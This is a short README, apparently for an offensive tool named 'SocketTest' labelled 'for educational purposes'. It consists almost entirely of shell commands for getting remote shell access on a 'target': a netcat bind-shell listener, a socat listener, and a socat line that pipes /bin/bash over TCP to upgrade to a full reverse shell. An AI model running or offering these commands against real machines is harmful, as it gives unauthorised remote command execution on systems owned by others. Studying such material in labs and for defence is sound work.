# SocketTest
Connecting to local pcs on a network.
For educational purposes.

# Start a server
nc -nlvp 1337 (for our custom bind shell)
# Start our client connection from target
./SocketTest -> Netcat Bind Shell

# Start a socat server (easier to upgrade to full reverse shell)
socat -d -d TCP4-LISTEN:9001 STDOUT

# Send this using our netcat bind
socat TCP4:127.0.0.1:9001 EXEC:/bin/bash